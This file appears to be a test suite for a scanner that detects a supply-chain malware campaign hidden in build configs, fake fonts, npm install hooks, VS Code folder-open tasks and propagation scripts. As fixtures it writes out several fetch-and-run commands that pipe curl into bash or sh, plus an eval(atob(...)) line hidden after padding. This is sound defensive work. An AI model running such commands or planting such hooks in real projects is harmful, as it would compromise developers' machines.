// Run with: node --test scripts/polinrider-scan.node-test.mjs
// Fixtures are built from the scanner's own fragments, so this file contains no indicator either.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
  MALICIOUS_PACKAGES,
  SIGNATURES as S,
  checkFontHeader,
  checkLockfile,
  checkPackageJson,
  parseArgs,
  run,
  scanHistory,
  scanText,
  scanTree,
} from './polinrider-scan.mjs';

const CLEAN_CONFIG =
  "/** @type {import('postcss-load-config').Config} */\nexport default { plugins: { tailwindcss: {} } };\n";
const rules = (findings) => findings.map((f) => f.rule);

function tempDir(files) {
  const dir = mkdtempSync(join(tmpdir(), 'polinrider-test-'));
  for (const [path, content] of Object.entries(files)) {
    const full = join(dir, path);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return dir;
}

test('a normal build config produces no finding', () => {
  assert.deepEqual(scanText('postcss.config.mjs', CLEAN_CONFIG), []);
  assert.deepEqual(
    scanText('tailwind.config.js', "module.exports = { content: ['./src/**/*.{js,ts}'] };\n"),
    [],
  );
});

test('variant one payload is found, with its line number', () => {
  const payload = `${CLEAN_CONFIG}${' '.repeat(200)}${S.globalBang}='8-270-2';var ${S.v1Decoder}=('${S.v1Marker}',${S.v1Seed1});`;
  const found = scanText('postcss.config.mjs', payload);
  assert.ok(rules(found).includes('payload-marker-v1'));
  assert.ok(rules(found).includes('payload-injection-tag'));
  assert.equal(found.find((f) => f.rule === 'payload-marker-v1').line, 3);
});

test('variant two payload (rotated constants) is found', () => {
  const payload = `${CLEAN_CONFIG}${S.globalV}='8-st12';var x=('${S.v2Marker}',${S.v2Seed1});`;
  const found = scanText('eslint.config.mjs', payload);
  assert.ok(rules(found).includes('payload-marker-v2'));
  assert.ok(rules(found).includes('payload-injection-tag'));
});

test('a rotated marker is still caught by the injection tag and the seed combinations', () => {
  assert.ok(
    rules(scanText('vite.config.js', `${S.globalV}='8-413';`)).includes('payload-injection-tag'),
  );
  assert.ok(
    rules(scanText('x.js', `${S.globalBang}=1;var a=${S.v1Seed1};`)).includes(
      'payload-v1-combination',
    ),
  );
  assert.ok(
    rules(scanText('x.js', `${S.globalV}=1;var a=${S.v2Seed1};`)).includes(
      'payload-v2-combination',
    ),
  );
  assert.ok(
    rules(scanText('x.js', `${S.globalR};${S.globalM};var a=${S.v2Seed1};`)).includes(
      'payload-require-module',
    ),
  );
});

test('a single seed number or a short name alone is not enough, so ordinary code is not flagged', () => {
  assert.deepEqual(scanText('src/data.js', `const n = ${S.v1Seed1}; const MDy = 5;`), []);
  assert.deepEqual(scanText('src/data.js', `const id = '${S.v2Seed2}';`), []);
});

test('second-stage infrastructure is found in any text file', () => {
  for (const [rule, value] of [
    ['c2-tron-address', S.tronAddresses[0]],
    ['c2-aptos-hash', S.aptosHashes[1]],
    ['c2-xor-key', S.xorKeys[0]],
    ['c2-template-uuid', S.templateUuid],
    ['c2-vercel-host', S.vercelHosts[1]],
  ]) {
    assert.ok(rules(scanText('notes/anything.md', `see ${value} here`)).includes(rule), rule);
  }
  assert.ok(
    rules(
      scanText(
        'run.sh',
        ['curl -s https://some-name', '.vercel.app/settings/mac?flag=3 | bash'].join(''),
      ),
    ).includes('c2-vercel-settings-url'),
  );
  assert.deepEqual(scanText('a.md', 'deploy to https://my-app.vercel.app/docs'), []);
});

test('a blockchain endpoint in source code is a warning, not a verdict', () => {
  const found = scanText('src/app.ts', `fetch('https://${S.chainEndpoints[0]}/v1/accounts/x')`);
  assert.deepEqual(rules(found), ['chain-endpoint-in-js']);
  assert.equal(found[0].severity, 'warn');
  assert.deepEqual(scanText('README.md', `uses ${S.chainEndpoints[0]}`), []);
});

test('code after a long run of spaces in a config file is flagged, and is high with eval', () => {
  const padded = `${CLEAN_CONFIG}${' '.repeat(150)}console.log(1);\n`;
  assert.deepEqual(rules(scanText('postcss.config.mjs', padded)), ['padded-code']);
  const hidden = `${CLEAN_CONFIG}${' '.repeat(150)}eval(atob('AAAA'));\n`;
  const found = scanText('postcss.config.mjs', hidden);
  assert.ok(rules(found).includes('padded-code-with-eval'));
  assert.equal(found.find((f) => f.rule === 'padded-code-with-eval').severity, 'high');
  assert.deepEqual(scanText('src/table.ts', `const a = 1;${' '.repeat(150)}// aligned\n`), []);
});

test('eval, globals and very long lines in a config file are warnings', () => {
  assert.deepEqual(rules(scanText('next.config.mjs', 'eval("1");\nexport default {};\n')), [
    'eval-in-config',
  ]);
  assert.deepEqual(rules(scanText('next.config.mjs', "global['x'] = 1;\nexport default {};\n")), [
    'global-in-config',
  ]);
  assert.deepEqual(
    rules(scanText('webpack.config.js', `module.exports = {};\n${'a'.repeat(1600)}\n`)),
    ['very-long-line'],
  );
});

test('a folder-open task that downloads and runs code is high; a harmless one is a warning', () => {
  const bad =
    '{"tasks":[{"label":"x","command":"curl -s https://example.com/x | bash","runOptions":{"runOn":"folderOpen"}}]}';
  assert.deepEqual(rules(scanText('.vscode/tasks.json', bad)), ['tasks-folder-open-download']);
  const okay =
    '{"tasks":[{"label":"build","command":"npm run build","runOptions":{"runOn":"folderOpen"}}]}';
  const found = scanText('app/.vscode/tasks.json', okay);
  assert.deepEqual(rules(found), ['tasks-folder-open']);
  assert.equal(found[0].severity, 'warn');
  assert.deepEqual(
    scanText('.vscode/tasks.json', '{"tasks":[{"label":"build","command":"make"}]}'),
    [],
  );
});

test('the propagation script content and the .gitignore entry are found', () => {
  assert.ok(
    rules(scanText('push.bat', 'set LAST_COMMIT_DATE=1\nset LAST_COMMIT_TIME=2')).includes(
      'propagation-script-content',
    ),
  );
  assert.deepEqual(scanText('build.bat', 'echo hello'), []);
  assert.ok(
    rules(scanText('.gitignore', 'node_modules\nconfig.bat\n')).includes(
      'gitignore-hides-orchestrator',
    ),
  );
  assert.deepEqual(scanText('.gitignore', 'node_modules\nconfig.batch\n'), []);
});

test('fake fonts are found, real fonts are not', () => {
  assert.deepEqual(
    checkFontHeader('a.woff2', Buffer.from('wOF2\u0000\u0001\u0000\u0000', 'latin1')),
    [],
  );
  assert.deepEqual(checkFontHeader('a.woff', Buffer.from('wOFF\u0000\u0001', 'latin1')), []);
  const text = checkFontHeader('a.woff2', Buffer.from("global['x']=require;"));
  assert.equal(text[0].rule, 'fake-font');
  assert.match(text[0].message, /plain text/);
  assert.equal(checkFontHeader('a.woff2', Buffer.from([1, 2, 3, 4, 5]))[0].rule, 'fake-font');
});

test('the malicious npm packages are found in package.json and in lockfiles', () => {
  for (const name of MALICIOUS_PACKAGES) {
    const pkg = JSON.stringify({ name: 'x', devDependencies: { [name]: '^1.0.0' } });
    assert.deepEqual(rules(checkPackageJson('package.json', pkg)), ['malicious-dependency'], name);
    assert.ok(
      rules(checkLockfile('pnpm-lock.yaml', `  /${name}@1.0.0:\n    resolution: {}`)).includes(
        'malicious-dependency-locked',
      ),
      name,
    );
  }
  assert.deepEqual(
    checkPackageJson(
      'package.json',
      JSON.stringify({ dependencies: { 'tailwindcss-animate': '^1.0.7', tailwindcss: '^3.4.0' } }),
    ),
    [],
  );
  assert.deepEqual(
    checkLockfile('pnpm-lock.yaml', '  /tailwindcss-animate@1.0.7:\n  /tailwindcss@3.4.0:\n'),
    [],
  );
});

test('install hooks that download or run code are high; ordinary ones are not', () => {
  const bad = JSON.stringify({ scripts: { postinstall: 'curl -s https://example.com/a | sh' } });
  assert.deepEqual(rules(checkPackageJson('package.json', bad)), ['install-hook-runs-code']);
  const hidden = JSON.stringify({ scripts: { prepare: 'node -e "require(1)"' } });
  assert.deepEqual(rules(checkPackageJson('package.json', hidden)), ['install-hook-runs-code']);
  assert.deepEqual(
    checkPackageJson(
      'package.json',
      JSON.stringify({ scripts: { prepare: 'husky', build: 'tsc' } }),
    ),
    [],
  );
  assert.deepEqual(rules(checkPackageJson('package.json', '{not json')), [
    'package-json-unreadable',
  ]);
});

test('scanTree finds artifacts, fake fonts and payloads by walking a directory, and skips node_modules', () => {
  const dir = tempDir({
    'postcss.config.mjs': `${CLEAN_CONFIG}${S.globalBang}='8-1-1';`,
    'temp_auto_push.bat': '@echo off',
    'config.bat': '@echo off',
    'sub/config.bat': '@echo off',
    'public/font.woff2': "global['x']=1;",
    'ok/index.js': 'export const a = 1;\n',
    'node_modules/evil/postcss.config.js': `${S.globalBang}='8-9-9';`,
  });
  try {
    const { findings, files } = scanTree(dir);
    const byFile = (file) => rules(findings.filter((f) => f.file === file));
    assert.ok(byFile('postcss.config.mjs').includes('payload-injection-tag'));
    assert.deepEqual(byFile('temp_auto_push.bat'), ['propagation-script']);
    assert.deepEqual(byFile('config.bat'), ['orchestrator-script']);
    assert.equal(findings.find((f) => f.file === 'config.bat').severity, 'high');
    assert.equal(findings.find((f) => f.file === 'sub/config.bat').severity, 'warn');
    assert.deepEqual(byFile('public/font.woff2'), ['fake-font']);
    assert.deepEqual(byFile('ok/index.js'), []);
    assert.equal(findings.filter((f) => f.file.startsWith('node_modules')).length, 0);
    assert.equal(files, 6);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

function gitIn(dir, ...args) {
  const r = spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], {
    cwd: dir,
    encoding: 'utf8',
  });
  assert.equal(r.status, 0, r.stderr);
}

test('scanHistory finds a payload that is gone from the latest files, and a past propagation script', () => {
  const dir = tempDir({ 'postcss.config.mjs': CLEAN_CONFIG });
  try {
    gitIn(dir, 'init', '-q');
    gitIn(dir, 'add', '.');
    gitIn(dir, 'commit', '-q', '-m', 'clean');
    writeFileSync(join(dir, 'postcss.config.mjs'), `${CLEAN_CONFIG}${S.globalV}='8-st3';`);
    writeFileSync(join(dir, 'temp_auto_push.bat'), '@echo off');
    gitIn(dir, 'add', '.');
    gitIn(dir, 'commit', '-q', '-m', 'bad');
    rmSync(join(dir, 'temp_auto_push.bat'));
    writeFileSync(join(dir, 'postcss.config.mjs'), CLEAN_CONFIG);
    gitIn(dir, 'add', '-A');
    gitIn(dir, 'commit', '-q', '-m', 'cleaned up');

    assert.deepEqual(scanTree(dir).findings, [], 'the latest files look clean');
    const history = scanHistory(dir);
    assert.equal(history.commits, 3);
    assert.ok(
      history.findings.some(
        (f) => f.rule === 'history-signature' && f.file === 'postcss.config.mjs',
      ),
    );
    assert.ok(
      history.findings.some(
        (f) => f.rule === 'history-propagation-script' && f.file === 'temp_auto_push.bat',
      ),
    );
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('scanHistory says so when there is no repository, and finds nothing in a clean history', () => {
  const plain = tempDir({ 'a.txt': 'x' });
  const clean = tempDir({ 'postcss.config.mjs': CLEAN_CONFIG });
  try {
    assert.match(scanHistory(plain).skipped ?? '', /not a git repository/);
    gitIn(clean, 'init', '-q');
    gitIn(clean, 'add', '.');
    gitIn(clean, 'commit', '-q', '-m', 'clean');
    assert.deepEqual(scanHistory(clean), { findings: [], commits: 1, skipped: null });
  } finally {
    rmSync(plain, { recursive: true, force: true });
    rmSync(clean, { recursive: true, force: true });
  }
});

test('parseArgs reads the options and refuses anything else', () => {
  assert.deepEqual(parseArgs([]), { dir: '.', history: false, strict: false, json: false });
  assert.deepEqual(parseArgs(['src', '--history', '--strict', '--json']), {
    dir: 'src',
    history: true,
    strict: true,
    json: true,
  });
  assert.throws(() => parseArgs(['--nope']), /Unknown option/);
  assert.throws(() => parseArgs(['a', 'b']), /at most one directory/);
});

test('run exits 0 when clean, 1 on a high finding, 1 on a warning only with --strict, 2 on bad usage', () => {
  const clean = tempDir({ 'postcss.config.mjs': CLEAN_CONFIG });
  const warned = tempDir({ 'next.config.mjs': 'eval("1");\nexport default {};\n' });
  const bad = tempDir({ 'postcss.config.mjs': `${CLEAN_CONFIG}${S.globalBang}='8-0-0';` });
  const lines = [];
  const out = (line) => lines.push(line);
  try {
    assert.equal(run([clean], out), 0);
    assert.match(lines.at(-2), /0 high, 0 warnings/);
    assert.equal(run([warned], out), 0);
    assert.equal(run([warned, '--strict'], out), 1);
    assert.equal(run([bad], out), 1);
    assert.ok(lines.some((l) => l.startsWith('HIGH  postcss.config.mjs:')));
    assert.equal(run([join(clean, 'does-not-exist')], out), 2);
    assert.equal(run(['--wat'], out), 2);
    const json = [];
    assert.equal(
      run([bad, '--json'], (l) => json.push(l)),
      1,
    );
    assert.equal(JSON.parse(json.join('')).findings[0].severity, 'high');
  } finally {
    for (const d of [clean, warned, bad]) rmSync(d, { recursive: true, force: true });
  }
});

test('the scanner never prints the content of a file it flags', () => {
  const secretish = `${S.globalBang}='8-0-0';var payload='UNIQUE_PAYLOAD_BODY_${'z'.repeat(40)}';`;
  const dir = tempDir({ 'postcss.config.mjs': `${CLEAN_CONFIG}${secretish}` });
  const lines = [];
  try {
    run([dir], (l) => lines.push(l));
    assert.ok(!lines.join('\n').includes('UNIQUE_PAYLOAD_BODY'));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('this package scans clean, which also shows the scanner does not match itself', () => {
  const here = dirname(fileURLToPath(import.meta.url));
  const { findings, files } = scanTree(join(here, '..'));
  assert.ok(files > 5);
  assert.deepEqual(
    findings.filter((f) => f.severity === 'high'),
    [],
  );
});
